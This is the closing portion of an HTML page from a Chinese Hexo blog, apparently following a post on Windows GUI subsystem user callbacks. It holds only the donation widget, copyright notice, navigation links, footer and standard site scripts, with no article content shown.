  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.jpg" alt="Catecat 微信">
        <span>微信</span>
      </div>
      <div>
        <img src="/images/alipay.jpg" alt="Catecat 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Catecat
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://directoree.github.io/post/Windows-GUI-Subsystem2/" title="GUI Subsystem 用户回调">https://directoree.github.io/post/Windows-GUI-Subsystem2/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Windows%E5%86%85%E6%A0%B8/" rel="tag"><i class="fa fa-tag"></i> Windows内核</a>
              <a href="/tags/GUI/" rel="tag"><i class="fa fa-tag"></i> GUI</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/post/Windows-GUI-Subsystem/" rel="prev" title="GUI Subsystem 用户对象">
                  <i class="fa fa-chevron-left"></i> GUI Subsystem 用户对象
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/post/x64-Disassembly/" rel="next" title="x64 常用指令">
                  x64 常用指令 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






      
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 2018 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Catecat</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">1.9m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">28:53</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1.15.0/dist/lozad.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/local-search.js"></script>








<script>
document.querySelectorAll('.pdfobject-container').forEach(element => {
  const url = element.dataset.target;
  const pdfOpenParams = {
    navpanes : 0,
    toolbar  : 0,
    statusbar: 0,
    pagemode : 'thumbs',
    view     : 'FitH'
  };
  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;

  if (NexT.utils.supportsPDFs()) {
    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
  } else {
    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
  }
});
</script>


<script>
if (document.querySelectorAll('.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
    mermaid.init({
      theme    : 'forest',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    }, '.mermaid');
  }, window.mermaid);
}
</script>





  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>








  

  
      <script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              const target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    const script = document.createElement('script');
    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.0/es5/tex-mml-chtml.js';
    script.defer = true;
    document.head.appendChild(script);
  } else {
    MathJax.startup.document.state(0);
    MathJax.typesetClear();
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

<script>
NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({"enable":true,"appId":"7zujCcS8pYH88CJXfdBlLyS8-gzGzoHsz","appKey":"lWGr7OPoNHo4v1YmVV5yr3E9","serverURLs":"https://7zujccs8.lc-cn-n1-shared.com","placeholder":"快来勾搭我呀🐶","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"bg":"/images/comment_bg.png","recordIP":false,"enableQQ":false,"requiredFields":["nick"]}, {
      el: '#valine-comments',
      path: "/post/Windows-GUI-Subsystem2/",
      serverURLs: "https://7zujccs8.lc-cn-n1-shared.com"
    }));
  }, window.Valine);
});
</script>

</body>
</html>
